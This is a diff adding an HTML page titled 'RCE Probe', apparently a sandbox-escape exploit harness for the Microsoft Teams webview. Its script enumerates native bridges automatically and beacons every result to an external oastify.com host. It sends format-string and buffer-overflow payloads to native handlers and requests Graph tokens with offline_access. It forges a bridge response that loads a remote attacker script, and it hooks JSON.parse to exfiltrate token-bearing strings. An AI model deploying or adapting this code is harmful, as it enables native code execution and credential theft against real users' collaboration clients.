@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>RCE Probe</title>
+<style>
+body{font-family:monospace;font-size:13px;padding:8px;background:#111;color:#0f0}
+pre{white-space:pre-wrap;word-break:break-all;font-size:11px;max-height:250px;overflow:auto;border:1px solid #333;padding:6px;margin:4px 0}
+button{display:block;width:100%;padding:10px;margin:4px 0;font-size:13px;font-family:monospace;text-align:left;border:1px solid #0f0;background:#222;color:#0f0}
+button:active{background:#0f0;color:#000}
+.r{border-color:#f00;color:#f00}
+h3{margin:12px 0 4px;color:#fff;font-size:14px}
+</style>
+</head>
+<body>
+<h3>Real RCE / Sandbox Escape Probe</h3>
+<pre id="log">Initializing...</pre>
+
+<h3>Phase 1: Enumeration (auto)</h3>
+<pre id="enum"></pre>
+
+<h3 class="r">Phase 2: Native Bridge RPC (manual)</h3>
+<button class="r" onclick="testJsApiBridge()">jsApiNativeBridge.invoke — RPC to native</button>
+<button class="r" onclick="testVideoAppHandler()">videoapp handler — direct video commands</button>
+<button class="r" onclick="testCallbackHandler()">callbackHandler — pptViewer native</button>
+<button class="r" onclick="testNativeLog()">nativeLog handler — log injection</button>
+<button class="r" onclick="testNestedAppAuth()">nestedAppAuthBridge — forge token request</button>
+
+<h3 class="r">Phase 3: Custom URL Scheme (manual)</h3>
+<button class="r" onclick="testVideoFramePost()">POST to microsoft-teams-video-frame: (buffer overflow)</button>
+<button class="r" onclick="testVideoFrameGet()">GET microsoft-teams-video-frame: (read native memory)</button>
+<button class="r" onclick="testCustomSchemes()">Probe all custom URL schemes</button>
+
+<h3 class="r">Phase 4: Code Injection (manual)</h3>
+<button class="r" onclick="testForgeResponse()">Forge jsApiNativeBridge.onResponse (script load hijack)</button>
+<button class="r" onclick="testEvalMethods()">Probe NI for eval/exec/load methods</button>
+<button class="r" onclick="testPrototypePollution()">Prototype pollution on native objects</button>
+
+<pre id="log2"></pre>
+
+<script>
+var OAST = '547gfzaui5yc074dn4b35c46qxwokt8i.oastify.com';
+var L = document.getElementById('log');
+var E = document.getElementById('enum');
+var L2 = document.getElementById('log2');
+var NI = window.nativeInterface;
+
+function log(msg) { L.textContent += '\n' + msg; }
+function elog(msg) { E.textContent += '\n' + msg; }
+function log2(msg) { L2.textContent += '\n' + msg; }
+
+function exfil(tag, data) {
+    var d = typeof data === 'string' ? data : JSON.stringify(data);
+    new Image().src = 'https://' + OAST + '/?t=' + tag + '&d=' + encodeURIComponent(d.substring(0, 2000)) + '&ts=' + Date.now();
+}
+
+// ==================================================
+// PHASE 1: DEEP ENUMERATION (runs automatically)
+// ==================================================
+
+(function enumerate() {
+
+    // 1A: NI properties — deep recursive enumeration
+    if (NI) {
+        log('NI available');
+        exfil('rce_ni_exists', 'props: ' + Object.getOwnPropertyNames(NI).length);
+
+        var niReport = {};
+        Object.getOwnPropertyNames(NI).forEach(function(p) {
+            try {
+                var val = NI[p];
+                var t = typeof val;
+                if (t === 'function') {
+                    niReport[p] = 'function(' + (val.length || 0) + ' args)';
+                } else if (t === 'object' && val !== null) {
+                    var subProps = Object.getOwnPropertyNames(val);
+                    niReport[p] = 'object{' + subProps.join(',') + '}';
+                    // Enumerate sub-object methods
+                    subProps.forEach(function(sp) {
+                        try {
+                            var sv = val[sp];
+                            if (typeof sv === 'function') {
+                                niReport[p + '.' + sp] = 'function(' + (sv.length || 0) + ' args)';
+                            }
+                        } catch(e) {}
+                    });
+                } else {
+                    niReport[p] = t + ': ' + String(val).substring(0, 100);
+                }
+            } catch(e) {
+                niReport[p] = 'ACCESS_ERROR: ' + e;
+            }
+        });
+        exfil('rce_ni_full_enum', niReport);
+        elog('NI PROPERTIES:');
+        Object.keys(niReport).forEach(function(k) {
+            elog('  ' + k + ' = ' + niReport[k]);
+        });
+    } else {
+        log('NI not available');
+        exfil('rce_no_ni', 'missing');
+    }
+
+    // 1B: ALL webkit.messageHandlers — enumerate registered handlers
+    var handlerReport = {};
+    if (window.webkit && window.webkit.messageHandlers) {
+        var mh = window.webkit.messageHandlers;
+        var knownHandlers = [
+            'listener', 'callbackHandler', 'videoapp', 'nativeLog',
+            'nestedAppAuthBridge', 'jsApiNativeBridge',
+            'invalidMessagePassed', 'onPreferencesChanged',
+            'readyForContent', 'launchSuccessful', 'tokenExpired', 'throttled',
+            // Speculative handlers
+            'evaluateJavaScript', 'executeScript', 'loadURL', 'openURL',
+            'downloadFile', 'writeFile', 'readFile', 'executeCommand',
+            'shellExec', 'processRequest', 'nativeBridge', 'bridge',
+            'appBridge', 'hostBridge', 'teamsNative', 'authBridge',
+            'fileBridge', 'mediaBridge', 'settingsBridge', 'clipboardBridge',
+            'notificationBridge', 'locationBridge', 'deviceBridge',
+            'keychainBridge', 'storageBridge', 'networkBridge',
+            'fluidBridge', 'meetingBridge', 'chatBridge', 'userBridge',
+            'messageBridge', 'webviewBridge', 'contextBridge',
+            'scriptHandler', 'codeHandler', 'remoteHandler'
+        ];
+
+        knownHandlers.forEach(function(name) {
+            try {
+                var h = mh[name];
+                if (h && typeof h.postMessage === 'function') {
+                    handlerReport[name] = 'AVAILABLE';
+                } else {
+                    handlerReport[name] = 'not registered';
+                }
+            } catch(e) {
+                handlerReport[name] = 'error: ' + e;
+            }
+        });
+
+        // Try Object.getOwnPropertyNames on messageHandlers
+        try {
+            var mhProps = Object.getOwnPropertyNames(mh);
+            handlerReport['__ownProps__'] = mhProps.join(',');
+        } catch(e) {
+            handlerReport['__ownProps__'] = 'enum failed: ' + e;
+        }
+
+        exfil('rce_handlers_enum', handlerReport);
+        elog('\nWEBKIT HANDLERS:');
+        Object.keys(handlerReport).forEach(function(k) {
+            if (handlerReport[k] === 'AVAILABLE') {
+                elog('  [+] ' + k + ' = AVAILABLE');
+            }
+        });
+        elog('  OwnProps: ' + (handlerReport['__ownProps__'] || 'none'));
+    }
+
+    // 1C: Check for jsApiNativeBridge in current context
+    if (window.jsApiNativeBridge) {
+        exfil('rce_jsapi_exists', 'jsApiNativeBridge in current context!');
+        elog('\n[!] jsApiNativeBridge exists in this context!');
+        try {
+            var jaProps = Object.getOwnPropertyNames(window.jsApiNativeBridge);
+            exfil('rce_jsapi_props', jaProps);
+            elog('  Props: ' + jaProps.join(', '));
+        } catch(e) {}
+    } else {
+        elog('\njsApiNativeBridge: not in this context');
+    }
+
+    // 1D: Check for AndroidBridge
+    if (window.AndroidBridge) {
+        exfil('rce_android_bridge', 'AndroidBridge exists!');
+        elog('\n[!] AndroidBridge exists!');
+    }
+
+    // 1E: Enumerate window for any native bridges/objects
+    var nativeLike = [];
+    var bridgeKeywords = ['bridge', 'native', 'host', 'webkit', 'handler', 'interface', 'channel', 'rpc'];
+    Object.getOwnPropertyNames(window).forEach(function(p) {
+        var pl = p.toLowerCase();
+        bridgeKeywords.forEach(function(kw) {
+            if (pl.indexOf(kw) !== -1 && p !== 'nativeInterface') {
+                try {
+                    nativeLike.push(p + ':' + typeof window[p]);
+                } catch(e) {}
+            }
+        });
+    });
+    if (nativeLike.length > 0) {
+        exfil('rce_native_objects', nativeLike);
+        elog('\nNATIVE-LIKE OBJECTS ON WINDOW:');
+        nativeLike.forEach(function(n) { elog('  ' + n); });
+    }
+
+    // 1F: Hook responses
+    if (NI) {
+        var origHR = NI.handleResponseFromNative;
+        NI.handleResponseFromNative = function(response, requestId) {
+            exfil('rce_resp_' + requestId, response);
+            log2('[RESP id=' + requestId + '] ' + String(response).substring(0, 300));
+            if (origHR) return origHR.apply(NI, arguments);
+        };
+        var origNM = window.onNativeMessage;
+        window.onNativeMessage = function(evt) {
+            var data = evt && evt.data ? evt.data : evt;
+            var id = data && data.id !== undefined ? data.id : 'noid';
+            exfil('rce_nm_' + id, data);
+            log2('[NM id=' + id + '] ' + JSON.stringify(data).substring(0, 300));
+            if (origNM) return origNM.call(window, evt);
+        };
+    }
+
+    log('Enumeration complete. Check OAST + log.');
+    exfil('rce_enum_done', 'phase1 complete');
+})();
+
+
+// ==================================================
+// PHASE 2: NATIVE BRIDGE RPC (manual buttons)
+// ==================================================
+
+function testJsApiBridge() {
+    log2('\n>>> jsApiNativeBridge test');
+    var mh = window.webkit && window.webkit.messageHandlers;
+    if (!mh) { log2('No webkit.messageHandlers'); return; }
+
+    // Try to invoke jsApiNativeBridge handler directly
+    try {
+        var payload = JSON.stringify({
+            method: 'fetchInitialParams',
+            params: {},
+            requestId: 'rce_' + Date.now()
+        });
+
+        if (mh.jsApiNativeBridge) {
+            mh.jsApiNativeBridge.postMessage(payload);
+            exfil('rce_jsapi_invoke', 'fetchInitialParams sent');
+            log2('  [+] jsApiNativeBridge.postMessage sent: fetchInitialParams');
+        } else {
+            exfil('rce_jsapi_missing', 'handler not registered');
+            log2('  [-] jsApiNativeBridge not registered in this context');
+        }
+    } catch(e) {
+        exfil('rce_jsapi_err', String(e));
+        log2('  Error: ' + e);
+    }
+
+    // Try fileToLoad — might return WOPI tokens
+    try {
+        if (mh.jsApiNativeBridge) {
+            var payload2 = JSON.stringify({
+                method: 'fileToLoad',
+                params: {},
+                requestId: 'rce_file_' + Date.now()
+            });
+            mh.jsApiNativeBridge.postMessage(payload2);
+            exfil('rce_jsapi_filetoload', 'fileToLoad sent');
+            log2('  [+] Sent fileToLoad request');
+        }
+    } catch(e) {
+        exfil('rce_jsapi_file_err', String(e));
+    }
+
+    // Try logEvent with crafted payload
+    try {
+        if (mh.jsApiNativeBridge) {
+            var payload3 = JSON.stringify({
+                method: 'logEvent',
+                params: {eventLevel: 'info', message: '"><img src=x onerror=alert(1)>'},
+                requestId: 'rce_log_' + Date.now()
+            });
+            mh.jsApiNativeBridge.postMessage(payload3);
+            exfil('rce_jsapi_loginject', 'logEvent with HTML injection sent');
+            log2('  [+] Sent logEvent with injection payload');
+        }
+    } catch(e) {}
+}
+
+function testVideoAppHandler() {
+    log2('\n>>> videoapp handler test');
+    var mh = window.webkit && window.webkit.messageHandlers;
+    if (!mh) return;
+
+    try {
+        if (mh.videoapp) {
+            // Send crafted video command
+            mh.videoapp.postMessage({
+                id: 9901,
+                timestamp: Date.now(),
+                func: 'video.registerForVideoFrame',
+                args: [JSON.stringify({format: 'NV12'})]
+            });
+            exfil('rce_videoapp_register', 'registerForVideoFrame sent');
+            log2('  [+] videoapp: registerForVideoFrame sent');
+
+            // Try arbitrary function through videoapp
+            mh.videoapp.postMessage({
+                id: 9902,
+                timestamp: Date.now(),
+                func: 'executeScript',
+                args: ['alert(1)']
+            });
+            exfil('rce_videoapp_exec', 'executeScript attempt');
+            log2('  [+] videoapp: executeScript attempt sent');
+        } else {
+            log2('  [-] videoapp not registered');
+            exfil('rce_videoapp_missing', 'not registered');
+        }
+    } catch(e) {
+        exfil('rce_videoapp_err', String(e));
+        log2('  Error: ' + e);
+    }
+}
+
+function testCallbackHandler() {
+    log2('\n>>> callbackHandler test (pptViewer/broadcast)');
+    var mh = window.webkit && window.webkit.messageHandlers;
+    if (!mh) return;
+
+    try {
+        if (mh.callbackHandler) {
+            // pptViewer initialize — triggers loadBootstrapperScript in response
+            mh.callbackHandler.postMessage({event: 'initialize'});
+            exfil('rce_callback_init', 'initialize sent');
+            log2('  [+] callbackHandler: initialize sent (pptViewer trigger)');
+
+            // Try scriptLoaded event
+            mh.callbackHandler.postMessage({event: 'scriptLoaded'});
+            exfil('rce_callback_scriptloaded', 'scriptLoaded sent');
+            log2('  [+] callbackHandler: scriptLoaded sent');
+
+            // Try to trigger logscenario with crafted data
+            mh.callbackHandler.postMessage({
+                type: 'logscenario',
+                message: 'test',
+                scenarioName: 'rce_probe'
+            });
+            exfil('rce_callback_log', 'logscenario sent');
+            log2('  [+] callbackHandler: logscenario sent');
+        } else {
+            log2('  [-] callbackHandler not registered');
+            exfil('rce_callback_missing', 'not registered');
+        }
+    } catch(e) {
+        exfil('rce_callback_err', String(e));
+        log2('  Error: ' + e);
+    }
+}
+
+function testNativeLog() {
+    log2('\n>>> nativeLog handler test');
+    var mh = window.webkit && window.webkit.messageHandlers;
+    if (!mh) return;
+
+    try {
+        if (mh.nativeLog) {
+            // Send crafted log message — could trigger format string vuln
+            mh.nativeLog.postMessage('%@%@%@%@%@%@%@%@');
+            exfil('rce_nativelog_fmtstr', 'format string sent');
+            log2('  [+] nativeLog: format string %@ payload sent');
+
+            mh.nativeLog.postMessage('%n%n%n%n%n%n%n%n');
+            exfil('rce_nativelog_pctN', '%n format string sent');
+            log2('  [+] nativeLog: %n payload sent');
+
+            // Very long string — buffer overflow
+            var longStr = '';
+            for (var i = 0; i < 10000; i++) longStr += 'A';
+            mh.nativeLog.postMessage(longStr);
+            exfil('rce_nativelog_overflow', 'sent 10KB string');
+            log2('  [+] nativeLog: 10KB overflow payload sent');
+        } else {
+            log2('  [-] nativeLog not registered');
+            exfil('rce_nativelog_missing', 'not registered');
+        }
+    } catch(e) {
+        exfil('rce_nativelog_err', String(e));
+        log2('  Error: ' + e);
+    }
+}
+
+function testNestedAppAuth() {
+    log2('\n>>> nestedAppAuthBridge test');
+    if (!window.nestedAppAuthBridge) {
+        log2('  [-] nestedAppAuthBridge not available');
+        return;
+    }
+
+    window.nestedAppAuthBridge.addEventListener('message', function(resp) {
+        exfil('rce_naa_resp', resp);
+        log2('[NAA] ' + String(resp).substring(0, 300));
+    });
+
+    // Try GetToken with offline_access (refresh token)
+    try {
+        window.nestedAppAuthBridge.postMessage(JSON.stringify({
+            messageType: 'NestedAppAuthRequest',
+            method: 'GetToken',
+            requestId: 'rce-naa-' + Date.now(),
+            clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+            scope: 'https://graph.microsoft.com/.default offline_access',
+            correlationId: 'rce-corr'
+        }));
+        exfil('rce_naa_offline', 'GetToken with offline_access');
+        log2('  [+] NAA: GetToken with offline_access sent');
+    } catch(e) {
+        exfil('rce_naa_err', String(e));
+    }
+
+    // Try GetInitContext
+    try {
+        window.nestedAppAuthBridge.postMessage(JSON.stringify({
+            messageType: 'NestedAppAuthRequest',
+            method: 'NestedAppAuthBridgeInit',
+            requestId: 'rce-init-' + Date.now(),
+            clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+            correlationId: 'rce-init-corr'
+        }));
+        log2('  [+] NAA: NestedAppAuthBridgeInit sent');
+    } catch(e) {}
+}
+
+
+// ==================================================
+// PHASE 3: CUSTOM URL SCHEME — BUFFER OVERFLOW
+// ==================================================
+
+function testVideoFramePost() {
+    log2('\n>>> POST to microsoft-teams-video-frame:');
+
+    // Test 1: Crafted buffer with malformed header
+    try {
+        var buf1 = new ArrayBuffer(256);
+        var view1 = new DataView(buf1);
+        // Craft header: timestamp(8) + format(4) + width(4) + height(4) + frameByteLength(4) + strides(12)
+        view1.setBigUint64(0, BigInt(0), true);  // timestamp
+        view1.setUint32(8, 0xFFFFFFFF, true);    // invalid format
+        view1.setUint32(12, 0xFFFFFFFF, true);   // width = MAX_UINT32
+        view1.setUint32(16, 0xFFFFFFFF, true);   // height = MAX_UINT32
+        view1.setUint32(20, 0xFFFFFFFF, true);   // frameByteLength = MAX (overflow!)
+        view1.setUint32(24, 0xFFFFFFFF, true);   // lumaStride
+        view1.setUint32(28, 0xFFFFFFFF, true);   // chromaStride
+        view1.setUint32(32, 0xFFFFFFFF, true);   // stride
+
+        fetch('microsoft-teams-video-frame:', {
+            method: 'POST',
+            body: buf1
+        }).then(function(r) {
+            exfil('rce_vf_post_malformed', 'status: ' + r.status);
+            log2('  [+] Malformed header POST: status=' + r.status);
+        }).catch(function(e) {
+            exfil('rce_vf_post_malformed_err', String(e));
+            log2('  [-] Malformed header POST error: ' + e);
+        });
+    } catch(e) {
+        exfil('rce_vf_post_err1', String(e));
+        log2('  Error: ' + e);
+    }
+
+    // Test 2: Empty buffer
+    try {
+        fetch('microsoft-teams-video-frame:', {
+            method: 'POST',
+            body: new ArrayBuffer(0)
+        }).then(function(r) {
+            exfil('rce_vf_post_empty', 'status: ' + r.status);
+            log2('  [+] Empty buffer POST: status=' + r.status);
+        }).catch(function(e) {
+            exfil('rce_vf_post_empty_err', String(e));
+            log2('  [-] Empty buffer error: ' + e);
+        });
+    } catch(e) {}
+
+    // Test 3: Huge buffer (1MB)
+    try {
+        var bigBuf = new ArrayBuffer(1024 * 1024);
+        var bigView = new Uint8Array(bigBuf);
+        for (var i = 0; i < 36; i++) bigView[i] = 0xFF;
+
+        fetch('microsoft-teams-video-frame:', {
+            method: 'POST',
+            body: bigBuf
+        }).then(function(r) {
+            exfil('rce_vf_post_1mb', 'status: ' + r.status);
+            log2('  [+] 1MB buffer POST: status=' + r.status);
+        }).catch(function(e) {
+            exfil('rce_vf_post_1mb_err', String(e));
+            log2('  [-] 1MB buffer error: ' + e);
+        });
+    } catch(e) {}
+
+    // Test 4: Negative-like values in header (signed/unsigned confusion)
+    try {
+        var buf4 = new ArrayBuffer(256);
+        var v4 = new DataView(buf4);
+        v4.setBigUint64(0, BigInt(0), true);
+        v4.setUint32(8, 1, true);            // format = NV12
+        v4.setUint32(12, 1920, true);        // width = normal
+        v4.setUint32(16, 1080, true);        // height = normal
+        v4.setInt32(20, -1, true);           // frameByteLength = -1 (signed = 0xFFFFFFFF unsigned)
+        v4.setUint32(24, 1920, true);
+        v4.setUint32(28, 960, true);
+        v4.setUint32(32, 1920, true);
+
+        fetch('microsoft-teams-video-frame:', {
+            method: 'POST',
+            body: buf4
+        }).then(function(r) {
+            exfil('rce_vf_post_neg', 'status: ' + r.status);
+            log2('  [+] Negative length POST: status=' + r.status);
+        }).catch(function(e) {
+            exfil('rce_vf_post_neg_err', String(e));
+            log2('  [-] Negative length error: ' + e);
+        });
+    } catch(e) {}
+}
+
+function testVideoFrameGet() {
+    log2('\n>>> GET microsoft-teams-video-frame:');
+
+    // Reading from this scheme fetches raw native memory (video frame buffer)
+    try {
+        fetch('microsoft-teams-video-frame:').then(function(r) {
+            exfil('rce_vf_get_status', 'status: ' + r.status + ' type: ' + r.type);
+            log2('  [+] GET status=' + r.status + ' type=' + r.type);
+            return r.arrayBuffer();
+        }).then(function(buf) {
+            var size = buf.byteLength;
+            exfil('rce_vf_get_size', 'buffer size: ' + size);
+            log2('  [+] Received buffer: ' + size + ' bytes');
+
+            if (size > 0) {
+                // Read header metadata
+                var meta = new Uint32Array(buf.slice(0, 36));
+                var headerInfo = {
+                    size: size,
+                    format: meta[2],
+                    width: meta[3],
+                    height: meta[4],
+                    frameLen: meta[5],
+                    lumaStride: meta[6],
+                    chromaStride: meta[7],
+                    stride: meta[8]
+                };
+                exfil('rce_vf_get_header', headerInfo);
+                log2('  [+] Frame header: ' + JSON.stringify(headerInfo));
+
+                // First 64 bytes as hex (might contain native memory data)
+                var first64 = new Uint8Array(buf.slice(0, 64));
+                var hex = Array.from(first64).map(function(b) {
+                    return ('0' + b.toString(16)).slice(-2);
+                }).join(' ');
+                exfil('rce_vf_get_hex', hex);
+                log2('  [+] First 64 bytes: ' + hex);
+            }
+        }).catch(function(e) {
+            exfil('rce_vf_get_err', String(e));
+            log2('  [-] GET error: ' + e);
+        });
+    } catch(e) {
+        exfil('rce_vf_get_throw', String(e));
+        log2('  Error: ' + e);
+    }
+}
+
+function testCustomSchemes() {
+    log2('\n>>> Probing custom URL schemes via fetch');
+
+    var schemes = [
+        'microsoft-teams-video-frame:',
+        'msteams:',
+        'msteams://test',
+        'ms-outlook:',
+        'appcenter:',
+        'ytplayer://test',
+        'blob:null/test',
+    ];
+
+    schemes.forEach(function(s) {
+        try {
+            fetch(s).then(function(r) {
+                exfil('rce_scheme_' + encodeURIComponent(s), 'status: ' + r.status);
+                log2('  ' + s + ' → status=' + r.status);
+            }).catch(function(e) {
+                exfil('rce_scheme_err_' + encodeURIComponent(s), String(e).substring(0, 200));
+                log2('  ' + s + ' → ' + String(e).substring(0, 80));
+            });
+        } catch(e) {}
+    });
+}
+
+
+// ==================================================
+// PHASE 4: CODE INJECTION
+// ==================================================
+
+function testForgeResponse() {
+    log2('\n>>> Forge jsApiNativeBridge.onResponse');
+
+    // If jsApiNativeBridge exists, try to forge a response that makes
+    // fetchInitialParams return a malicious bootstrapperUrl
+    if (window.jsApiNativeBridge && window.jsApiNativeBridge.onResponse) {
+        try {
+            // Forge response with attacker-controlled bootstrapperUrl
+            var forged = JSON.stringify({
+                requestId: Object.keys(window.jsApiNativeBridge.pendingRequests || {})[0] || 'rce_forge',
+                status: 'success',
+                result: {
+                    appName: 'Word',
+                    bootstrapperUrl: 'https://' + OAST + '/evil-bootstrapper.js',
+                    storageHostname: 'attacker.example.com',
+                    uiHostName: 'attacker.example.com',
+                    userId: 'forged',
+                    sessionId: 'forged',
+                    enableZoom: false
+                }
+            });
+            window.jsApiNativeBridge.onResponse(forged);
+            exfil('rce_forge_sent', 'forged response injected');
+            log2('  [+] Forged onResponse injected — check if script loads');
+        } catch(e) {
+            exfil('rce_forge_err', String(e));
+            log2('  Error: ' + e);
+        }
+    } else {
+        log2('  [-] jsApiNativeBridge.onResponse not available in this context');
+
+        // Try creating it
+        try {
+            window.jsApiNativeBridge = {
+                pendingRequests: {},
+                invoke: function(method, params) {
+                    exfil('rce_fake_invoke_' + method, params);
+                    log2('  [FAKE INVOKE] ' + method);
+                    return new Promise(function(resolve) { resolve({}); });
+                },
+                onResponse: function(e) {
+                    exfil('rce_fake_response', e);
+                    log2('  [FAKE RESPONSE] ' + e);
+                }
+            };
+            exfil('rce_fake_bridge', 'created fake jsApiNativeBridge');
+            log2('  [+] Created fake jsApiNativeBridge — waiting for native calls');
+        } catch(e) {
+            exfil('rce_fake_bridge_err', String(e));
+            log2('  Error creating fake bridge: ' + e);
+        }
+    }
+}
+
+function testEvalMethods() {
+    log2('\n>>> Probing NI for eval/exec methods');
+    if (!NI) return;
+
+    var dangerousMethods = [
+        'eval', 'exec', 'execute', 'run', 'call', 'apply', 'invoke',
+        'evaluateJavaScript', 'executeScript', 'runScript', 'loadScript',
+        'loadURL', 'loadUrl', 'navigateToUrl', 'openUrl', 'openURL',
+        'writeFile', 'readFile', 'deleteFile', 'downloadFile',
+        'executeNative', 'callNative', 'nativeEval', 'bridgeEval',
+        'sendNativeMessage', 'postNativeMessage', 'dispatchNativeEvent',
+        'getKeychain', 'setKeychain', 'readKeychain',
+        'getCredential', 'getPassword', 'getToken',
+        'installApp', 'launchApp', 'execCommand', 'shellExec',
+        'processData', 'parseData', 'deserialize'
+    ];
+
+    dangerousMethods.forEach(function(m) {
+        try {
+            if (typeof NI[m] === 'function') {
+                exfil('rce_ni_dangerous_' + m, 'FOUND: function');
+                log2('  [!!!] NI.' + m + ' EXISTS as function!');
+            } else if (NI[m] !== undefined) {
+                exfil('rce_ni_has_' + m, typeof NI[m]);
+                log2('  [?] NI.' + m + ' = ' + typeof NI[m]);
+            }
+        } catch(e) {}
+    });
+
+    // Also check on videoExtHandler
+    if (NI.videoExtHandler) {
+        Object.getOwnPropertyNames(NI.videoExtHandler).forEach(function(p) {
+            if (typeof NI.videoExtHandler[p] === 'function') {
+                exfil('rce_veh_method_' + p, 'function');
+                log2('  videoExtHandler.' + p + '()');
+            }
+        });
+
+        // Check prototype chain
+        var proto = Object.getPrototypeOf(NI.videoExtHandler);
+        if (proto) {
+            var protoMethods = Object.getOwnPropertyNames(proto).filter(function(p) {
+                return typeof proto[p] === 'function' && p !== 'constructor';
+            });
+            exfil('rce_veh_proto', protoMethods);
+            log2('  videoExtHandler prototype methods: ' + protoMethods.join(', '));
+        }
+    }
+
+    log2('  Probe complete');
+    exfil('rce_eval_probe_done', 'complete');
+}
+
+function testPrototypePollution() {
+    log2('\n>>> Prototype pollution on native objects');
+
+    // Try to override Object.prototype to intercept native calls
+    try {
+        var origToString = Object.prototype.toString;
+        var interceptCount = 0;
+        Object.prototype.toString = function() {
+            interceptCount++;
+            if (interceptCount <= 5) {
+                try {
+                    var keys = Object.keys(this);
+                    if (keys.length > 0) {
+                        exfil('rce_proto_intercept', {type: typeof this, keys: keys.slice(0, 10)});
+                        log2('  [INTERCEPT] toString on: ' + keys.slice(0, 5).join(','));
+                    }
+                } catch(e) {}
+            }
+            return origToString.call(this);
+        };
+        log2('  [+] Object.prototype.toString overridden');
+
+        // Trigger some native calls to see if our intercept catches anything
+        if (NI) {
+            NI.framelessPostMessage(JSON.stringify({
+                func: 'getContext',
+                id: 9800,
+                args: []
+            }));
+            log2('  [+] Triggered getContext to test interception');
+        }
+
+        // Restore after 3 seconds
+        setTimeout(function() {
+            Object.prototype.toString = origToString;
+            exfil('rce_proto_restore', 'intercepts: ' + interceptCount);
+            log2('  Restored toString, intercepts: ' + interceptCount);
+        }, 3000);
+    } catch(e) {
+        exfil('rce_proto_err', String(e));
+        log2('  Error: ' + e);
+    }
+
+    // Try JSON.parse override to intercept native JSON responses
+    try {
+        var origParse = JSON.parse;
+        JSON.parse = function(str) {
+            var result = origParse.call(JSON, str);
+            if (typeof str === 'string' && str.indexOf('token') !== -1) {
+                exfil('rce_json_intercept_token', str.substring(0, 500));
+                log2('  [JSON INTERCEPT] token-containing: ' + str.substring(0, 100));
+            }
+            return result;
+        };
+        log2('  [+] JSON.parse overridden — intercepting all JSON parsing');
+
+        setTimeout(function() {
+            JSON.parse = origParse;
+            log2('  JSON.parse restored');
+        }, 5000);
+    } catch(e) {}
+}
+</script>
+</body>
+</html>
